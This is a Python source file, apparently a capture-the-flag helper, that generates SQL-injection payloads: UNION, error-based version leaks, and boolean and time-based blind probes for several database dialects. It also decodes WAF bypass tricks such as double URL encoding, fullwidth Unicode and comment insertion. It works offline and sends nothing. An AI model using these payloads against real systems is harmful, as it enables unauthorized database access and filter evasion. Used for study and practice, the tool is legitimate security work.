#!/usr/bin/env python3
"""Offline SQL-injection payload planner and filter-bypass decoder.

The generator needs facts the player already learned about the assigned
challenge: the number of UNION columns, the syntactic injection context, and
(for database-specific error/time primitives) the SQL dialect.  It returns
request *values* only.  This module has no HTTP client, sends no request, does
not enumerate a target, and never submits a candidate flag.

The decoder peels common transport/filter tricks from a saved value:
iterated URL encoding, Unicode NFKC compatibility forms, inline SQL comments,
and MySQL executable comments.  Every intermediate value is retained so the
player can see exactly which transform produced the canonical form.

CLI examples (all offline)::

    .venv/bin/python solvers/web/sqli_helper.py generate --columns 3 \
        --context string --dialect mysql --reflected-column 2
    .venv/bin/python solvers/web/sqli_helper.py decode \
        'ＵＮ/**/ＩＯＮ%2520ＳＥＬ/**/ＥＣＴ' --json
"""

from __future__ import annotations

import argparse
import json
import re
import sys
import unicodedata
import urllib.parse
from typing import Any


DIALECTS = ("generic", "mysql", "postgresql", "sqlite", "mssql", "oracle")
CONTEXTS = ("string", "double", "numeric", "string_paren", "numeric_paren", "raw")

_CONTEXT_CLOSE = {
    "string": "'",
    "double": '"',
    "numeric": "",
    "string_paren": "')",
    "numeric_paren": ")",
    "raw": "",
}

_DIALECT_ALIASES = {
    "postgres": "postgresql",
    "pgsql": "postgresql",
    "postgresql": "postgresql",
    "sqlserver": "mssql",
    "ms-sql": "mssql",
    "mariadb": "mysql",
}


def _dialect_name(value: str) -> str:
    value = str(value).strip().lower()
    value = _DIALECT_ALIASES.get(value, value)
    if value not in DIALECTS:
        raise ValueError(f"unknown dialect {value!r}; choose one of: {', '.join(DIALECTS)}")
    return value


def _sql_string(value: str, *, national: bool = False) -> str:
    value = str(value)
    if "\x00" in value or len(value) > 1024:
        raise ValueError("marker must contain no NUL and be at most 1024 characters")
    return ("N" if national else "") + "'" + value.replace("'", "''") + "'"


def _comment_for(dialect: str) -> str:
    # The trailing space matters for MySQL's -- comment syntax and is harmless
    # for the other supported dialects.
    return "-- "


def _compose(close: str, body: str, comment: str) -> str:
    payload = f"{close}{body}"
    if comment:
        payload += " " + comment
    return payload


def _row(rank: int, dialect: str, technique: str, variant: str, payload: str | None,
         *, expected: str, note: str, pair: str | None = None) -> dict[str, Any]:
    out: dict[str, Any] = {
        "rank": rank,
        "dialect": dialect,
        "technique": technique,
        "variant": variant,
        "available": payload is not None,
        "payload": payload,
        "expected": expected,
        "note": note,
        "offline": True,
    }
    if pair:
        out["control_pair"] = pair
    return out


def _union_body(column_count: int, reflected_column: int, marker: str, dialect: str) -> str:
    national = dialect == "mssql"
    columns = ["NULL"] * column_count
    columns[reflected_column - 1] = _sql_string(marker, national=national)
    select = " UNION ALL SELECT " + ",".join(columns)
    if dialect == "oracle":
        select += " FROM dual"
    return select


def _error_body(dialect: str) -> tuple[str | None, str]:
    if dialect == "mysql":
        return (
            " AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT VERSION()),0x7e))",
            "the database error should contain ~<version>~",
        )
    if dialect == "postgresql":
        return (
            " AND 1=CAST((SELECT VERSION()) AS INTEGER)",
            "the failed integer cast should quote the selected version string",
        )
    if dialect == "mssql":
        return (
            " AND 1=CONVERT(INT,@@VERSION)",
            "the conversion error should quote part of @@VERSION",
        )
    if dialect == "oracle":
        return (
            " AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))",
            "an Oracle Text error may include the selected banner",
        )
    return None, "no portable value-bearing error primitive for this dialect; select a known DBMS"


def _time_body(dialect: str, condition: str, delay: int) -> tuple[str | None, str]:
    if dialect == "mysql":
        return f" AND IF({condition},SLEEP({delay}),0)=0", "MySQL SLEEP"
    if dialect == "postgresql":
        return (
            f" AND CASE WHEN {condition} THEN (SELECT 1 FROM pg_sleep({delay})) ELSE 1 END=1",
            "PostgreSQL pg_sleep",
        )
    if dialect == "mssql":
        seconds = min(delay, 59)
        return f"; IF ({condition}) WAITFOR DELAY '00:00:{seconds:02d}'", "SQL Server WAITFOR"
    if dialect == "oracle":
        return (
            f" AND CASE WHEN {condition} THEN DBMS_PIPE.RECEIVE_MESSAGE('CSCTF', {delay}) ELSE 0 END=0",
            "Oracle DBMS_PIPE delay (privilege/package availability varies)",
        )
    return None, "no portable sleep primitive for this dialect; select a known DBMS"


def generate_payloads(column_count: int, *, context: str = "string", dialect: str = "generic",
                      reflected_column: int = 1, marker: str = "CSCTF_SQLI_MARKER",
                      close: str | None = None, comment: str | None = None,
                      delay: int = 3) -> list[dict[str, Any]]:
    """Return ranked UNION/error/boolean/time request values.

    ``close`` is the exact text that closes the player's injection point.  If
    omitted it is selected from ``context``.  ``comment`` similarly overrides
    the dialect's trailing-comment spelling.  Boolean and time techniques are
    emitted as true/false control pairs: timing or a page difference is not
    evidence unless the paired control behaves differently.
    """

    try:
        column_count = int(column_count)
        reflected_column = int(reflected_column)
        delay = int(delay)
    except (TypeError, ValueError, OverflowError) as exc:
        raise ValueError("column_count, reflected_column, and delay must be integers") from exc
    if not 1 <= column_count <= 128:
        raise ValueError("column_count must be between 1 and 128")
    if not 1 <= reflected_column <= column_count:
        raise ValueError("reflected_column must be within the UNION column count")
    if not 1 <= delay <= 30:
        raise ValueError("delay must be between 1 and 30 seconds")
    context = str(context).strip().lower()
    if context not in CONTEXTS:
        raise ValueError(f"unknown context {context!r}; choose one of: {', '.join(CONTEXTS)}")
    dialect = _dialect_name(dialect)
    close = _CONTEXT_CLOSE[context] if close is None else str(close)
    comment = _comment_for(dialect) if comment is None else str(comment)

    rows: list[dict[str, Any]] = []
    union = _compose(close, _union_body(column_count, reflected_column, marker, dialect), comment)
    rows.append(_row(
        1, dialect, "union", "reflected_marker", union,
        expected=f"the response renders the literal marker {marker!r} from column {reflected_column}",
        note="replace only the marker expression after the reflected column is confirmed",
    ))

    error_body, error_note = _error_body(dialect)
    error_payload = _compose(close, error_body, comment) if error_body else None
    rows.append(_row(
        2, dialect, "error", "version_leak", error_payload,
        expected=error_note if error_payload else "unavailable",
        note=("database errors must be visible in the saved response" if error_payload else error_note),
    ))

    for offset, (variant, condition, expected) in enumerate((
        ("true", "7=7", "same application branch as a true predicate"),
        ("false", "7=8", "different application branch from the paired true predicate"),
    ), start=3):
        rows.append(_row(
            offset, dialect, "boolean", variant,
            _compose(close, f" AND {condition}", comment),
            expected=expected,
            note="compare this pair by status/body semantics, not by one byte-length change",
            pair="boolean-7",
        ))

    for offset, (variant, condition, expectation) in enumerate((
        ("true", "7=7", f"approximately {delay}s slower than the false control"),
        ("false", "7=8", "no deliberate delay"),
    ), start=5):
        body, primitive = _time_body(dialect, condition, delay)
        rows.append(_row(
            offset, dialect, "time", variant,
            _compose(close, body, comment) if body else None,
            expected=expectation if body else "unavailable",
            note=(f"{primitive}; repeat manually only as needed and respect target request caps" if body else primitive),
            pair=f"time-{delay}s",
        ))
    return rows


def generate_all_dialects(column_count: int, **kwargs: Any) -> list[dict[str, Any]]:
    """Generate plans for each concrete dialect, preserving a single rank order."""

    rows: list[dict[str, Any]] = []
    for dialect in DIALECTS[1:]:
        rows.extend(generate_payloads(column_count, dialect=dialect, **kwargs))
    for rank, row in enumerate(rows, 1):
        row["rank"] = rank
    return rows


_MYSQL_EXEC_COMMENT = re.compile(r"/\*!\s*(?:\d{5,6}\s*)?(.*?)\*/", re.S)
_BLOCK_COMMENT = re.compile(r"/\*.*?\*/", re.S)
_DASH_COMMENT = re.compile(r"--(?=\s|$)[^\r\n]*(?:\r?\n|$)")
_HASH_COMMENT = re.compile(r"(?m)#[^\r\n]*(?:\r?\n|$)")
_SQL_KEYWORD = re.compile(
    r"\b(?:SELECT|UNION|INSERT|UPDATE|DELETE|DROP|FROM|WHERE|AND|OR|SLEEP|WAITFOR|CASE|WHEN|THEN)\b",
    re.I,
)


def _comment_decode(value: str) -> tuple[str, dict[str, int]]:
    counts = {
        "mysql_executable": len(_MYSQL_EXEC_COMMENT.findall(value)),
        "block": 0,
        "line": 0,
    }
    # MySQL's /*!50000 SELECT */ is code, not a discarded comment.  Preserve
    # its body before removing ordinary insertion comments.
    expanded = _MYSQL_EXEC_COMMENT.sub(lambda match: match.group(1), value)
    counts["block"] = len(_BLOCK_COMMENT.findall(expanded))
    expanded = _BLOCK_COMMENT.sub("", expanded)
    dash = _DASH_COMMENT.findall(expanded)
    hashes = _HASH_COMMENT.findall(expanded)
    counts["line"] = len(dash) + len(hashes)
    expanded = _DASH_COMMENT.sub("\n", expanded)
    expanded = _HASH_COMMENT.sub("\n", expanded)
    return expanded, counts


def decode_filter_bypasses(value: Any, *, max_url_rounds: int = 4) -> dict[str, Any]:
    """Peel common SQLi filter bypasses from a saved string, without SQL execution."""

    if isinstance(value, bytes):
        raw = value.decode("utf-8", "replace")
    else:
        raw = str(value)
    try:
        max_url_rounds = int(max_url_rounds)
    except (TypeError, ValueError, OverflowError) as exc:
        raise ValueError("max_url_rounds must be an integer between 0 and 8") from exc
    if not 0 <= max_url_rounds <= 8:
        raise ValueError("max_url_rounds must be between 0 and 8")
    if len(raw) > 1_000_000:
        raise ValueError("input is too large (maximum 1,000,000 characters)")

    stages: list[dict[str, Any]] = [{"rank": 1, "method": "input", "value": raw}]
    current = raw
    url_rounds = 0
    for round_number in range(1, max_url_rounds + 1):
        decoded = urllib.parse.unquote(current, encoding="utf-8", errors="replace")
        if decoded == current:
            break
        current = decoded
        url_rounds += 1
        stages.append({
            "rank": len(stages) + 1,
            "method": f"url_decode_{round_number}",
            "value": current,
        })

    # Keep application/x-www-form-urlencoded semantics as a separate branch:
    # literal '+' means a space there, while it must remain literal in the
    # canonical percent-decoding branch above.  Iterate it independently so a
    # nested value such as %252B is visible after each decoding layer.
    form_current = raw
    form_stages = []
    for round_number in range(1, max_url_rounds + 1):
        decoded = urllib.parse.unquote_plus(form_current, encoding="utf-8", errors="replace")
        if decoded == form_current:
            break
        form_current = decoded
        form_stages.append({"round": round_number, "value": form_current})
    form_note = form_current if form_current != current else None

    normalized = unicodedata.normalize("NFKC", current)
    nfkc_changed = normalized != current
    unicode_changes = []
    if nfkc_changed:
        # Normalize one source code point at a time for the explanation.  NFKC
        # may expand a compatibility character (for example a ligature) into
        # several code points, so zipping whole before/after strings would
        # misalign every character after the expansion.
        for before in current:
            replacement = unicodedata.normalize("NFKC", before)
            if before != replacement:
                rendered = " + ".join(
                    f"U+{ord(after):04X} {unicodedata.name(after, 'UNKNOWN')}"
                    for after in replacement
                )
                unicode_changes.append({
                    "from": f"U+{ord(before):04X} {unicodedata.name(before, 'UNKNOWN')}",
                    "to": rendered,
                })
                if len(unicode_changes) >= 64:
                    break
        current = normalized
        stages.append({"rank": len(stages) + 1, "method": "unicode_nfkc", "value": current})

    uncommented, comment_counts = _comment_decode(current)
    comments_changed = uncommented != current
    if comments_changed:
        current = uncommented
        stages.append({"rank": len(stages) + 1, "method": "sql_comment_decode", "value": current})

    canonical = re.sub(r"\s+", " ", current).strip()
    if canonical != current:
        stages.append({"rank": len(stages) + 1, "method": "whitespace_collapse", "value": canonical})

    bypasses = []
    if url_rounds >= 2:
        bypasses.append("double_url_encoding")
    elif url_rounds == 1:
        bypasses.append("url_encoding")
    if nfkc_changed:
        bypasses.append("unicode_nfkc")
    if comments_changed:
        bypasses.append("comment_insertion")
    if comment_counts["mysql_executable"]:
        bypasses.append("mysql_executable_comment")

    keywords = []
    seen = set()
    for match in _SQL_KEYWORD.finditer(canonical):
        keyword = match.group(0).upper()
        if keyword not in seen:
            seen.add(keyword)
            keywords.append(keyword)

    return {
        "offline": True,
        "flag": None,
        "input": raw,
        "canonical": canonical,
        "bypasses": bypasses,
        "url_decode_rounds": url_rounds,
        "form_url_variant": form_note,
        "form_url_stages": form_stages,
        "unicode_changes": unicode_changes,
        "comment_counts": comment_counts,
        "keywords": keywords,
        "candidates": stages,
        "note": "decoded as text only; no SQL was parsed or executed",
    }


def _parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Offline SQLi payload planner and bypass decoder")
    sub = parser.add_subparsers(dest="cmd", required=True)

    generate = sub.add_parser("generate", help="build request values from known injection facts")
    generate.add_argument("--columns", required=True, type=int)
    generate.add_argument("--context", choices=CONTEXTS, default="string")
    generate.add_argument("--dialect", choices=DIALECTS + ("all",), default="generic")
    generate.add_argument("--reflected-column", type=int, default=1)
    generate.add_argument("--marker", default="CSCTF_SQLI_MARKER")
    generate.add_argument("--close", help="exact injection-point closing text (overrides --context)")
    generate.add_argument("--comment", help="exact trailing comment text")
    generate.add_argument("--delay", type=int, default=3)
    generate.add_argument("--json", action="store_true")

    decode = sub.add_parser("decode", help="decode a saved/obfuscated value")
    decode.add_argument("value")
    decode.add_argument("--max-url-rounds", type=int, default=4)
    decode.add_argument("--json", action="store_true")
    return parser


def _human_generate(rows: list[dict[str, Any]]) -> None:
    for row in rows:
        label = f"{row['rank']}. [{row['dialect']} {row['technique']}/{row['variant']}]"
        if row["available"]:
            print(f"{label} {row['payload']}")
            print(f"   expect: {row['expected']}")
        else:
            print(f"{label} unavailable: {row['note']}")


def main(argv: list[str] | None = None) -> int:
    try:
        args = _parser().parse_args(argv)
    except SystemExit as exc:
        return exc.code if isinstance(exc.code, int) else 2
    try:
        if args.cmd == "generate":
            kwargs = {
                "context": args.context,
                "reflected_column": args.reflected_column,
                "marker": args.marker,
                "close": args.close,
                "comment": args.comment,
                "delay": args.delay,
            }
            if args.dialect == "all":
                result: Any = generate_all_dialects(args.columns, **kwargs)
            else:
                result = generate_payloads(args.columns, dialect=args.dialect, **kwargs)
        else:
            result = decode_filter_bypasses(args.value, max_url_rounds=args.max_url_rounds)
    except (ValueError, TypeError) as exc:
        print(f"sqli_helper: {exc}", file=sys.stderr)
        return 2

    if args.json:
        print(json.dumps(result, indent=2, ensure_ascii=False, sort_keys=True))
    elif args.cmd == "generate":
        _human_generate(result)
    else:
        print(f"canonical: {result['canonical']}")
        print("bypasses: " + (", ".join(result["bypasses"]) or "none recognized"))
        for stage in result["candidates"]:
            print(f"{stage['rank']}. {stage['method']}: {stage['value']}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
